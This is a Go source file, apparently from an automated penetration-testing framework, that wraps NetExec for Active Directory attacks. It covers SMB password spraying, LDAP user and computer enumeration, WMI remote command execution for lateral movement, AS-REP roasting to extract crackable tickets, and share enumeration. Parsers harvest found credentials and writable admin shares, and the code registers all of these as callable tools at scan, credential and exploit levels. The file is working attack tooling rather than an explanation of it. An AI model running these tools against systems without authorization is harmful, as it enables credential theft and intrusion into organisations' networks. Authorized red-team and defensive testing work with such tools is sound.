package scenarios

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/Coff0xc/vero/internal/tools"
)

// ---------- NetExec (nxc) 完整集成 ----------

// SMB 凭证喷射 —— 用单个密码测试用户列表, 发现弱凭证。
func nxcSMBSpray(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	userlist := tools.ArgStr(args, "userlist", "")
	password := tools.ArgStr(args, "password", "")

	// 支持单用户或用户列表文件
	var userArg []string
	if strings.HasSuffix(userlist, ".txt") {
		userArg = []string{"-u", userlist} // 文件
	} else {
		userArg = []string{"-u", userlist} // 单个用户名
	}

	cmd := append([]string{"nxc", "smb", target}, userArg...)
	cmd = append(cmd, "-p", password, "--continue-on-success")
	return tools.Sh(cmd, 180*time.Second)
}

// LDAP 域信息枚举 —— 提取域用户/组/计算机列表。
func nxcLDAPEnum(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	user := tools.ArgStr(args, "user", "")
	pass := tools.ArgStr(args, "pass", "")

	return tools.Sh([]string{"nxc", "ldap", target,
		"-u", user, "-p", pass,
		"--users", "--groups"}, 120*time.Second)
}

// LDAP 计算机枚举 —— 提取域内所有计算机。
func nxcLDAPComputers(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	user := tools.ArgStr(args, "user", "")
	pass := tools.ArgStr(args, "pass", "")

	return tools.Sh([]string{"nxc", "ldap", target,
		"-u", user, "-p", pass,
		"--computers"}, 120*time.Second)
}

// WMI 远程命令执行 —— 通过 WMI 在远程主机执行命令(需凭证)。
func nxcWMIExec(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	user := tools.ArgStr(args, "user", "")
	pass := tools.ArgStr(args, "pass", "")
	cmd := tools.ArgStr(args, "cmd", "whoami")

	return tools.Sh([]string{"nxc", "wmi", target,
		"-u", user, "-p", pass,
		"-x", cmd}, 90*time.Second)
}

// AS-REP Roasting —— 对无预认证要求的账户提取 TGT, 离线破解。
func nxcASREP(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	userlist := tools.ArgStr(args, "userlist", "users.txt")
	outfile := tools.ArgStr(args, "outfile", "asrep.txt")

	return tools.Sh([]string{"nxc", "ldap", target,
		"-u", userlist, "--asreproast", outfile}, 180*time.Second)
}

// SMB 共享枚举 —— 列出目标所有 SMB 共享及权限。
func nxcSMBShares(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "")
	user := tools.ArgStr(args, "user", "")
	pass := tools.ArgStr(args, "pass", "")

	return tools.Sh([]string{"nxc", "smb", target,
		"-u", user, "-p", pass,
		"--shares"}, 90*time.Second)
}

// ---------- Parsers ----------

var (
	// NetExec 成功凭证输出格式: SMB  192.168.1.100  445  DC01  [+] DOMAIN\user:password
	reNXCCred = regexp.MustCompile(`\[(\+|\*)\]\s+(\S+)\\(\S+):(\S+)`)

	// LDAP 用户枚举: [*] Username: alice  badPwdCount: 0
	reNXCUser = regexp.MustCompile(`Username:\s+(\S+)`)

	// LDAP 计算机枚举: [*] Computer: WS01.domain.local
	reNXCComputer = regexp.MustCompile(`Computer:\s+(\S+)`)

	// SMB 共享: [*] ADMIN$  READ  Administrative share
	reNXCShare = regexp.MustCompile(`\[\*\]\s+(\S+)\s+(READ|WRITE|READ,WRITE)\s`)
)

// ParseNXCCreds —— 从 nxc smb spray 输出提取成功的凭证。
func ParseNXCCreds(stdout string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	target := tools.ArgStr(args, "target", "?")

	for _, line := range strings.Split(stdout, "\n") {
		if m := reNXCCred.FindStringSubmatch(line); m != nil {
			domain, user, pass := m[2], m[3], m[4]
			credKey := fmt.Sprintf("%s\\%s", domain, user)
			obs = append(obs, tools.Observation{
				Kind:    "cred",
				Key:     credKey,
				Label:   fmt.Sprintf("%s:%s (from %s)", credKey, pass, target),
				Excerpt: strings.TrimSpace(line),
			})
		}
	}
	return obs
}

// ParseNXCUsers —— 从 nxc ldap --users 输出提取域用户列表。
func ParseNXCUsers(stdout string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	target := tools.ArgStr(args, "target", "?")
	seen := make(map[string]bool)

	for _, line := range strings.Split(stdout, "\n") {
		if m := reNXCUser.FindStringSubmatch(line); m != nil {
			username := m[1]
			if seen[username] {
				continue
			}
			seen[username] = true

			obs = append(obs, tools.Observation{
				Kind:    "finding",
				Key:     target + ":user:" + username,
				Label:   fmt.Sprintf("[info] Domain user: %s", username),
				Excerpt: strings.TrimSpace(line),
			})
		}
	}
	return obs
}

// ParseNXCComputers —— 从 nxc ldap --computers 输出提取域内计算机。
func ParseNXCComputers(stdout string, args map[string]any) []tools.Observation {
	var obs []tools.Observation

	for _, line := range strings.Split(stdout, "\n") {
		if m := reNXCComputer.FindStringSubmatch(line); m != nil {
			computer := m[1]
			// 提取短主机名(去掉 .domain.local)
			shortName := computer
			if i := strings.Index(computer, "."); i > 0 {
				shortName = computer[:i]
			}

			obs = append(obs, tools.Observation{
				Kind:    "host",
				Key:     shortName,
				Label:   computer,
				Excerpt: strings.TrimSpace(line),
			})
		}
	}
	return obs
}

// ParseNXCShares —— 从 nxc smb --shares 输出提取共享及权限。
func ParseNXCShares(stdout string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	target := tools.ArgStr(args, "target", "?")

	for _, line := range strings.Split(stdout, "\n") {
		if m := reNXCShare.FindStringSubmatch(line); m != nil {
			share, perm := m[1], m[2]
			// 敏感共享: ADMIN$, C$, SYSVOL, NETLOGON
			sensitive := strings.Contains(share, "$") || share == "SYSVOL" || share == "NETLOGON"
			label := fmt.Sprintf("[info] SMB share: %s (%s)", share, perm)
			if sensitive && strings.Contains(perm, "WRITE") {
				label = fmt.Sprintf("[high] Writable admin share: %s", share)
			}

			obs = append(obs, tools.Observation{
				Kind:    "finding",
				Key:     target + ":share:" + share,
				Label:   label,
				Excerpt: strings.TrimSpace(line),
			})
		}
	}
	return obs
}

// ADPackEnhanced —— 增强 AD 场景包: 补全 NetExec 全套工具。
func ADPackEnhanced() Pack {
	return Pack{
		Name: "ad_enhanced",
		Tools: []*tools.Tool{
			// 原有工具(保留向后兼容)
			{Name: "smb_enum", Level: tools.LevelScan,
				Desc: "SMB 枚举(nxc), 需目标 445/SMB 开放(Windows/Samba)",
				Run: smbEnum, Parse: ParseSMB},
			{Name: "kerberoast", Level: tools.LevelCred,
				Desc: "Kerberoasting(nxc), 需 AD 域凭证(user/pass)",
				Run: kerberoast},

			// 新增工具
			{Name: "nxc_smb_spray", Level: tools.LevelCred,
				Desc: "SMB 凭证喷射(nxc), 用单密码测试用户列表, 发现弱凭证",
				Run: nxcSMBSpray, Parse: ParseNXCCreds,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "目标主机/IP", Required: true},
					{Name: "userlist", Desc: "用户列表文件路径", Required: true},
					{Name: "password", Desc: "待测试的单个密码", Required: true},
				}},
			{Name: "nxc_ldap_enum", Level: tools.LevelScan,
				Desc: "LDAP 域枚举(nxc), 提取域用户/组列表",
				Run: nxcLDAPEnum, Parse: ParseNXCUsers,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "域控主机/IP", Required: true},
					{Name: "user", Desc: "域用户名", Required: true},
					{Name: "pass", Desc: "域密码", Required: true},
				}},
			{Name: "nxc_ldap_computers", Level: tools.LevelScan,
				Desc: "LDAP 计算机枚举(nxc), 提取域内所有主机",
				Run: nxcLDAPComputers, Parse: ParseNXCComputers,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "域控主机/IP", Required: true},
					{Name: "user", Desc: "域用户名", Required: true},
					{Name: "pass", Desc: "域密码", Required: true},
				}},
			{Name: "nxc_wmi_exec", Level: tools.LevelExploit,
				Desc: "WMI 远程命令执行(nxc), 横向移动: 在目标主机执行命令",
				Run: nxcWMIExec, Produces: "shell",
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "目标主机/IP", Required: true},
					{Name: "user", Desc: "域用户名", Required: true},
					{Name: "pass", Desc: "域密码", Required: true},
					{Name: "cmd", Desc: "要执行的命令, 如 whoami", Required: true},
				}},
			{Name: "nxc_asrep", Level: tools.LevelCred,
				Desc: "AS-REP Roasting(nxc), 提取无预认证账户 TGT 供离线破解",
				Run: nxcASREP,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "域控主机/IP", Required: true},
					{Name: "userlist", Desc: "用户列表文件路径", Required: true},
				}},
			{Name: "nxc_smb_shares", Level: tools.LevelScan,
				Desc: "SMB 共享枚举(nxc), 列出所有共享及权限",
				Run: nxcSMBShares, Parse: ParseNXCShares,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "目标主机/IP", Required: true},
					{Name: "user", Desc: "用户名", Required: true},
					{Name: "pass", Desc: "密码", Required: true},
				}},
		},
		Fingerprint: func(s map[string]bool) bool {
			return s["microsoft-ds"] || s["netbios-ssn"] || s["ldap"] || s["kerberos-sec"]
		},
	}
}
